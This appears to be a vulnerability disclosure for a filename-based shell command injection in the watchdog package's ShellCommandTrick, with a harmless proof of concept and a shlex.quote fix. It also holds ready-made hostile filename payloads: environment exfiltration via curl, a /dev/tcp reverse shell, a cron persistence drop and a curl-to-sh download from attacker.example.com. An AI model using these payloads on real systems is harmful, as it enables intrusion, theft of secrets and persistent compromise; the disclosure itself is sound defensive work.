# Finding: Watchdog ShellCommandTrick — Command Injection via Filename

## Package Information

| Field      | Value                                              |
| ---------- | -------------------------------------------------- |
| Package    | watchdog                                           |
| Version    | 6.0.0 (latest at time of research)                 |
| PyPI       | https://pypi.org/project/watchdog/                 |
| GitHub     | https://github.com/gorakhargosh/watchdog           |
| Maintainer | gorakhargosh / community                           |
| File       | `watchdog/tricks/__init__.py`                      |
| Lines      | 130–131                                            |

---

## Summary

`ShellCommandTrick` is a watchdog helper that executes a configurable shell command each time a filesystem event (file create, modify, delete) occurs. It substitutes the event's source path (`event.src_path`) into the command template using Python's `string.Template.safe_substitute()`. Because `safe_substitute` performs no shell-escaping, an attacker who can create a file with a malicious name in the watched directory can inject arbitrary shell commands that execute with the privileges of the process running the watchdog observer.

---

## CVSS Score

**7.8 — High**

| Metric               | Value     | Rationale                                                          |
| -------------------- | --------- | ------------------------------------------------------------------ |
| Attack Vector        | Local     | Attacker must be able to create a file in the watched directory    |
| Attack Complexity    | Low       | No special conditions; create file with metacharacters in name     |
| Privileges Required  | Low       | Attacker needs write access to the watched directory only          |
| User Interaction     | None      | No other user needs to take any action                             |
| Scope                | Unchanged | Commands run as the watchdog process user                          |
| Confidentiality      | High      | Arbitrary read of files accessible to the watchdog process         |
| Integrity            | High      | Arbitrary write or code execution                                  |
| Availability         | High      | Can kill processes or corrupt data watched by the observer         |

CVSS 3.1 Vector: `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

---

## Vulnerability Details

### Source (User-Controlled Input)

```python
# watchdog/tricks/__init__.py, line 113
context = {
    "watch_src_path": event.src_path,   # ← derived from filesystem filename
    ...
}
```

`event.src_path` is the full path of the file that triggered the event. On Linux, any character except NUL (`\0`) and slash (`/`) is valid in a filename. An attacker who can write to the watched directory can create a file whose name contains `$()` command substitution, backtick execution, or semicolons.

### Sink (Dangerous Execution)

```python
# watchdog/tricks/__init__.py, lines 130-131
command = Template(command).safe_substitute(**context)
self.process = subprocess.Popen(command, shell=True)
```

### Root Cause

`Template.safe_substitute()` is a Python string operation — it replaces `${watch_src_path}` with the raw path string, with no escaping. The shell metacharacters in the filename survive substitution verbatim. Because the result is passed to `Popen` with `shell=True`, the shell interprets those characters as commands.

`safe_substitute` is "safe" in the sense that it does not raise `KeyError` on missing keys — it is **not** safe against shell injection.

---

## Proof of Concept

### Stage 1 — Direct Substitution

```python
from string import Template
import subprocess

shell_command = 'echo "File changed: ${watch_src_path}"'
malicious_path = '/tmp/watched/$(touch /tmp/watchdog_poc_pwned).log'

context = {'watch_src_path': malicious_path, ...}
command = Template(shell_command).safe_substitute(**context)
# command: echo "File changed: /tmp/watched/$(touch /tmp/watchdog_poc_pwned).log"

subprocess.Popen(command, shell=True).wait()
# $() executes even inside double-quoted strings — /tmp/watchdog_poc_pwned is created
```

**Output:**
```
File changed: /tmp/watched/.log
[+] SUCCESS: $() command substitution fired — /tmp/watchdog_poc_pwned created
```

### Stage 2 — End-to-End via watchdog Observer

```python
handler = ShellCommandTrick(
    shell_command='echo changed: ${watch_src_path}',
    patterns=['*'],
    wait_for_process=True,
)
observer = Observer()
observer.schedule(handler, watch_dir, recursive=False)
observer.start()

# Attacker creates file with malicious name (no '/' in the filename itself)
malicious_name = '$(touch watchdog_stage2_proof).log'
open(os.path.join(watch_dir, malicious_name), 'w').close()
```

**Constructed and executed command:**
```sh
echo changed: /tmp/watched/$(touch watchdog_stage2_proof).log
```

**Output:**
```
[+] SUCCESS: End-to-end injection confirmed.
    Proof file created by ShellCommandTrick: /home/user/.../watchdog_stage2_proof
```

### Real-World Payload Examples

```bash
# Exfiltrate environment variables (no slashes in filename needed)
$(curl $EXFIL_URL?d=$(env|base64)).log

# Reverse shell (attacker sets up listener first)
$(bash -i >&/dev/tcp/$ATTACKER_HOST/$PORT 0>&1).log

# Drop a cron job for persistence
$(crontab -l; echo "* * * * * /bin/bash /tmp/payload.sh")|crontab -.log
```

---

## Attack Scenario

An application uses `watchmedo shell-command` or `ShellCommandTrick` in a Python script to monitor a directory for changes and run a processing command on each new file. A shared upload directory, a CI artifact folder, or any directory where external users can add files qualifies.

The attacker uploads a file named `$(curl http://attacker.example.com/shell.sh | sh).txt`. The moment the file appears, watchdog triggers `ShellCommandTrick`, substitutes the path, and the shell downloads and executes the attacker's payload — all without any error in the watchdog process itself.

---

## Impact

Any process using `ShellCommandTrick` to monitor a directory where an attacker can create files is fully compromised. The injected command runs with the same privileges as the observer process. In CI/CD or server-side file processing scenarios, this is typically a service account with broad filesystem access.

---

## Remediation

Shell-escape `src_path` before substitution using `shlex.quote()`:

```python
import shlex
from string import Template

# Safe: metacharacters in the path are quoted before shell sees them
safe_context = {k: shlex.quote(v) if isinstance(v, str) else v
                for k, v in context.items()}
command = Template(self.shell_command).safe_substitute(**safe_context)
self.process = subprocess.Popen(command, shell=True)
```

Alternatively, avoid `shell=True` entirely and pass arguments as a list, requiring the template to reference a fixed script with the path as a safe argument.

---

## References

- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [watchdog ShellCommandTrick source](https://github.com/gorakhargosh/watchdog/blob/master/src/watchdog/tricks/__init__.py)
- [Python string.Template.safe_substitute](https://docs.python.org/3/library/string.html#string.Template.safe_substitute)
- [Python subprocess security](https://docs.python.org/3/library/subprocess.html#security-considerations)
